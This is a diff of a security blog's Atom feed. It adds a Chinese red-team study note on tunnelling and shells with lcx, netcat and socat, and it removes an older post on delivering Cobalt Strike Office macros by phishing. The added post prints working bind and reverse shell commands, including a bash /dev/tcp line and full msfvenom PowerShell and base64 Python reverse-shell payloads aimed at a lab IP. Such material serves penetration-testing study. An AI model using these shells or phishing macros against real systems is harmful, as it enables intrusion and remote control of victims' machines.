@@ -6,7 +6,7 @@
   <link href="https://www.teamssix.com/atom.xml" rel="self"/>
   
   <link href="https://www.teamssix.com/"/>
-  <updated>2021-04-07T11:30:27.165Z</updated>
+  <updated>2021-05-28T05:15:41.428Z</updated>
   <id>https://www.teamssix.com/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>【内网学习笔记】7、lcx、netcat和socat的使用</title>
+    <link href="https://www.teamssix.com/year/210528-130449.html"/>
+    <id>https://www.teamssix.com/year/210528-130449.html</id>
+    <published>2021-05-28T05:04:49.000Z</published>
+    <updated>2021-05-28T05:15:41.428Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="1、lcx-使用"><a href="#1、lcx-使用" class="headerlink" title="1、lcx 使用"></a>1、lcx 使用</h2><p>lcx 分为 Windows 版和 Linux 版，Linux 版叫 portmap</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul><li>内网端口转发</li></ul><pre><code>内网失陷主机lcx.exe -slave rhost rport lhost lport公网代理主机lcx.exe -listen lport1 lport2</code></pre><pre><code>内网失陷主机lcx.exe -slave 123.123.123.123 4444 127.0.0.1 3389公网代理主机lcx.exe -listen 4444 5555</code></pre><p>在建立连接后，访问公网代理主机的 5555 端口就能访问到内网失陷主机的 3389 端口了。</p><ul><li>本地端口映射</li></ul><p>如果目标主机不能出网，这时可以利用内网中能够出网的主机，将其不能出网的主机端口映射到自身上，再借助端口转发到公网进行访问。</p><pre><code>lcx.exe -tran 53 &lt;目标主机 IP 地址&gt; 3389</code></pre><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul><li>内网端口转发</li></ul><pre><code>内网失陷主机./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 &lt;公网主机 IP&gt; -p2 4444公网代理主机./portmap -m 2 -p1 4444 -h2 &lt;公网主机 IP&gt; -p2 5555</code></pre><p>此时访问公网主机 IP 的 5555 端口，就会访问到内网失陷主机的 22 端口了。</p><h2 id="2、netcat-使用"><a href="#2、netcat-使用" class="headerlink" title="2、netcat 使用"></a>2、netcat 使用</h2><p>nc 下载地址：<a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p><p>nc 全称 netcat，它的功能很多，这里简单记录下两个常用的功能，其他的比如文件传输、端口扫描等等的就不介绍了，毕竟平时使用频率有一说一还是比较少的。</p><pre><code>-l 开启监听状态-v 显示详细信息-p 指定监听的本地端口-k 客户端断掉连接时，服务端依然保持运行-e 将传入的信息以命令执行-n 直接使用 IP 地址，不进行 dns 解析过程</code></pre><h3 id="获取-banner-信息"><a href="#获取-banner-信息" class="headerlink" title="获取 banner 信息"></a>获取 banner 信息</h3><p>个人觉着最常用的功能，这个不仅可以用来查看 banner 信息，还能用来判断端口是否开放。</p><pre><code>nc -vv rhost rport</code></pre><pre><code>&gt; nc -v 172.16.214.43 22Connection to 172.16.214.43 port 22 [tcp/ssh] succeeded!SSH-2.0-OpenSSH_8.4p1 Debian-3</code></pre><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>个人觉着这个也是最常用的功能，可以使用 -e 指定 /bin/bash 进行反弹，也可以直接 -c 指定 bash 或者 cmd</p><p><strong>-e 指定反弹 shell</strong></p><pre><code># 失陷主机nc -lvp lport -e /bin/bash        # linux 主机nc -lvp lport -e c:\windows\system32\cmd.exe     # windows 主机# 控制端nc rhost rport</code></pre><pre><code># 失陷主机&gt; nc -lvp 4444 -e /bin/bashlistening on [any] 4444 ...172.16.214.1: inverse host lookup failed: Unknown hostconnect to [172.16.214.43] from (UNKNOWN) [172.16.214.1] 60628# 控制端&gt; nc -v 172.16.214.43 4444Connection to 172.16.214.43 port 4444 [tcp/krb524] succeeded!whoamiroot</code></pre><p><strong>-c 指定反弹 shell</strong></p><pre><code># 失陷主机nc -lvp lprot -c bash    # linux 主机nc -lvp lport -c cmd     # windows 主机# 控制端nc rhost rport</code></pre><pre><code># 失陷主机&gt; nc -lvp 4444 -c bashlistening on [any] 4444 ...172.16.214.1: inverse host lookup failed: Unknown hostconnect to [172.16.214.43] from (UNKNOWN) [172.16.214.1] 60635# 控制端&gt; nc -v 172.16.214.43 4444Connection to 172.16.214.43 port 4444 [tcp/krb524] succeeded!whoamiroot</code></pre><p><strong>结合其他语言进行反弹 shell</strong></p><pre><code># 失陷主机bash -i &gt;&amp; /dev/tcp/rhost/rport 0&gt;&amp;1# 控制端nc -lvp lprot</code></pre><pre><code># 失陷主机&gt; bash -i &gt;&amp; /dev/tcp/172.16.214.43/4444 0&gt;&amp;1# 控制端&gt; nc -lp 4444root@ubuntu:~# whoamiwhoamiroot</code></pre><p>除了 bash 也可以使用其他的语言进行反弹 shell，这里可以使用 msfvenom 生成反弹 shell，操作起来比较方便，使用 <code>msfvenom -l payload | grep &quot;cmd/&quot;</code>可查看可使用的 payload</p><p>比如使用 <code>cmd/windows/reverse_powershell</code> 这个 payload</p><pre><code># 控制端&gt; msfvenom -p cmd/windows/reverse_powershell lhost=172.16.214.43 lport=4444[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: cmd from the payloadNo encoder specified, outputting raw payloadPayload size: 1586 bytespowershell -w hidden -nop -c $a=&#39;172.16.214.43&#39;;$b=4444;$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName=&#39;cmd.exe&#39;;$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) &#123;    start-sleep -m 100;    if ($osread.IsCompleted -and $osread.Result -ne 0) &#123;      $r=$os.BaseStream.EndRead($osread);      $s.Write($ob,0,$r);      $s.Flush();      $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);    &#125;    if ($esread.IsCompleted -and $esread.Result -ne 0) &#123;      $r=$es.BaseStream.EndRead($esread);      $s.Write($eb,0,$r);      $s.Flush();      $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);    &#125;    if ($s.DataAvailable) &#123;      $r=$s.Read($nb,0,$nb.Length);      if ($r -lt 1) &#123;          break;      &#125; else &#123;          $str=$e.GetString($nb,0,$r);          $is.write($str);      &#125;    &#125;    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) &#123;        break;    &#125;    if ($p.ExitCode -ne $null) &#123;        break;    &#125;&#125;&gt; nc -lvp 4444</code></pre><p>将生成的 payload 复制到失陷主机上运行，即可收到反弹回的 shell</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-05-28_12-36-45.png"></p><p>再比如使用 <code>cmd/unix/reverse_python</code> 这个payload</p><pre><code># 控制端&gt; msfvenom -p cmd/unix/reverse_python lhost=172.16.214.43 lport=4444[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload[-] No arch selected, selecting arch: cmd from the payloadNo encoder specified, outputting raw payloadPayload size: 505 bytespython -c &quot;exec(__import__(&#39;base64&#39;).b64decode(__import__(&#39;codecs&#39;).getencoder(&#39;utf-8&#39;)(&#39;aW1wb3J0IHNvY2tldCAgICwgc3VicHJvY2VzcyAgICwgb3M7ICAgICAgaG9zdD0iMTcyLjE2LjIxNC40MyI7ICAgICAgcG9ydD00NDQ0OyAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICwgc29ja2V0LlNPQ0tfU1RSRUFNKTsgICAgICBzLmNvbm5lY3QoKGhvc3QgICAsIHBvcnQpKTsgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAsIDApOyAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICwgMSk7ICAgICAgb3MuZHVwMihzLmZpbGVubygpICAgLCAyKTsgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik=&#39;)[0]))&quot;&gt; nc -lvp 4444</code></pre><p>同样将生成的 payload 复制到失陷主机上运行，即可收到反弹回来的 shell，当然前提是目标主机安装了 python</p><h2 id="3、socat-使用"><a href="#3、socat-使用" class="headerlink" title="3、socat 使用"></a>3、socat 使用</h2><p>socat 下载地址：<a href="http://www.dest-unreach.org/socat/">http://www.dest-unreach.org/socat/</a>，或者直接使用 <code>apt-get install socat</code> 安装，Mac 可使用 <code>brew install socat</code> 安装。</p><p>socat 全称 socket cat，可以视为 nc 的加强版，不过平时感觉 nc 也够用了，但是 nc 现在貌似会被杀软杀掉，而且貌似 nc 很久没更新了，反正多掌握点知识没坏处。</p><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><p><strong>读取文件</strong></p><pre><code>&gt; socat - ./test.txt      # 相对路径读取test&gt; socat - /tmp/test.txt    # 绝对路径读取test</code></pre><p><strong>写入文件</strong></p><pre><code>&gt; echo &quot;hello world&quot; | socat - ./test.txt&gt; socat - ./test.txttesthello world</code></pre><h3 id="网络操作"><a href="#网络操作" class="headerlink" title="网络操作"></a>网络操作</h3><p><strong>连接远程端口</strong></p><pre><code>&gt; socat - TCP:172.16.214.1:22SSH-2.0-OpenSSH_7.4</code></pre><p><strong>监听端口</strong></p><pre><code>socat - TCP-LISTEN:8002</code></pre><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p><strong>转发 TCP 端口</strong></p><p>个人觉着这个是比较常用到的功能，在使用 CS 做重定向器时，就可以使用 socat 进行端口的转发。</p><pre><code>socat TCP4-LISTEN:80,fork TCP4:123.123.123.123:80</code></pre><p>这样在访问当前主机的 80 端口时，就会访问到 123.123.123.123 的 80 端口了，也可以使用 -d 调整输出信息的详细程度，最多使用四个 d，推荐使用两个，即 -dd</p><pre><code>socat -dd TCP4-LISTEN:80,fork TCP4:123.123.123.123:80</code></pre><p><strong>转发 UDP 端口</strong></p><p>和上面一样，将 TCP 改成 UDP 即可</p><pre><code>socat UDP4-LISTEN:80,fork UDP4:123.123.123.123:80</code></pre><p><strong>NAT 映射</strong></p><p>通过 socat 可以将内网端口映射到公网上，不过这种场景还是更推荐用 frp</p><pre><code># 内网主机socat tcp:123.123.123.123:4444 tcp:127.0.0.1:3389# 公网主机socat tcp-listen:4444 tcp-listen:5555</code></pre><p>此时访问公网主机的 5555 端口就可以访问到内网主机的 3389 端口了</p><p>考虑到 socat 的其他功能平时也很少使用到，这里就不过多介绍了，网上相关文章也有很多，在此就不赘述了。</p><blockquote><p>参考链接：</p><p><a href="https://www.sqlsec.com/2019/10/nc.html">https://www.sqlsec.com/2019/10/nc.html</a></p><p><a href="https://www.hi-linux.com/posts/61543.html">https://www.hi-linux.com/posts/61543.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;1、lcx-使用&quot;&gt;&lt;a href=&quot;#1、lcx-使用&quot; class=&quot;headerlink&quot; title=&quot;1、lcx 使用&quot;&gt;&lt;/a&gt;1、lcx 使用&lt;/h2&gt;&lt;p&gt;lcx 分为 Windows 版和 Linux 版，Linux 版叫 portmap&lt;/p&gt;</summary>
+      
+    
+    
+    
+    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    
+    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
+    
+    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
+    
+  </entry>
   
   <entry>
     <title>【内网学习笔记】6、ICMP隧道工具使用</title>
@@ -541,34 +569,6 @@
     <category term="工具分享" scheme="https://www.teamssix.com/tags/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
     
     <category term="Github" scheme="https://www.teamssix.com/tags/Github/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【CS学习笔记】28、白名单申请和宏渗透</title>
-    <link href="https://www.teamssix.com/year/200419-150740.html"/>
-    <id>https://www.teamssix.com/year/200419-150740.html</id>
-    <published>2020-04-19T07:07:40.000Z</published>
-    <updated>2020-10-16T05:15:52.000Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这是 Cobalt Strike 学习笔记的最后一节，这节将来学习白名单申请与宏渗透的一些方法。</p><h1 id="0x01-白名单申请"><a href="#0x01-白名单申请" class="headerlink" title="0x01 白名单申请"></a>0x01 白名单申请</h1><p>Win + R 打开运行窗口，输入 <code>gpedit.msc</code> ，来到 <code>用户配置 -&gt; 管理模板 -&gt; 系统</code> 处，打开 <code>只允许指定的 Windows 程序</code></p><p>在打开的窗口中，勾选<code>已启用</code>，之后点击<code>显示</code>按钮，在其中写入白名单的程序名称后，点击两次确定之后即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-1.png"></p><h1 id="0x02-建立宏攻击"><a href="#0x02-建立宏攻击" class="headerlink" title="0x02 建立宏攻击"></a>0x02 建立宏攻击</h1><p>在 Cobalt Strike 客户端上，选择 <code>Packages --&gt; MS Office Macro</code>，指定一个监听器，点击 <code>Generate</code>，之后根据提示的步骤生成一个 Word 文档。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-2.png"></p><p>大体的步骤如下：</p><p>1、打开 Microsoft Word 或者 Excel</p><p>2、来到 <code>视图 --&gt; 宏</code></p><p>3、任意填写一个宏的名称</p><p>4、宏的位置选择为当前文档</p><p>5、点击创建</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-3.png"></p><p>6、在打开的编辑器中，删除掉原来的内容</p><p>7、点击 Cobalt Strike 上的 <code>Copy Macro</code> 按钮</p><p>8、将刚复制 Cobalt Strike 生成的内容粘贴到打开的编辑器中</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-4.png"></p><p>9、关闭编辑器</p><p>10、将文档保存为启用宏的文档，这里可以选择保存为 <code>启用宏的 Word 文档</code> 或者 <code>Word 97-2003 文档</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-5.png"></p><p>接下来使用钓鱼邮件等方式上传到靶机，当靶机运行该文档后启用宏内容即可上线。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-6.png"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-7.png"></p><blockquote><p>这里不得不吐槽一句，Microsoft Office 的东西安装是真的麻烦。</p></blockquote><p>在上面 2-8 步骤创建编辑宏内容的过程，也可以打开 <code>开发工具 --&gt; Visual Basic</code> 界面，这里推荐使用快捷键<code>Alt+F11</code>打开该界面。</p><p>之后编辑<code>ThisDocument</code> 模块，粘贴宏代码也可以达到上述 2-8 步的效果。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-8.png"></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>自 4 月 19 日发布 Cobalt Strike 第一节笔记开始，已经过去了半年的时间，踩过了无数坑，解决了无数的坑。</p><p>感谢 Cobalt Strike 的作者 <code>Raphael Mudge</code> 的课程，感谢 UP <code>Hack 学习呀</code> 上传的中文翻译版本，感谢 <code>A-Team</code> 团队的 Cobalt Strike 4.0 中文翻译手册，感谢每篇笔记最后参考链接的作者们，感谢曾经帮助我解决所碰到问题的大佬们，谢谢你们。</p><p>最后，还有一点要注意的就是， <code>CS学习笔记</code>系列只是我个人在学习 Cobalt Strike 的过程中所做的笔记，建议不要当做教程看，因为其中我本身已经知道的知识点和感觉不重要知识点我是没有记录的。</p><p>将自己的笔记公开发出来的目的有二：一是便于自己遗忘时随时查找，这也是17年我建立这个公众号的主要目的；二是在笔记中我会记录一些坑的解决方法，如果你碰到和我一样的问题，或许我这小菜鸟写的笔记就能帮助到你。</p><blockquote><p>参考链接：<a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;这是 Cobalt Strike 学习笔记的最后一节，这节将来学习白名单申请与宏渗透的一些方法。&lt;/</summary>
-      
-    
-    
-    
-    <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    
-    <category term="Cobalt Strike" scheme="https://www.teamssix.com/tags/Cobalt-Strike/"/>
-    
-    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
     
   </entry>
   
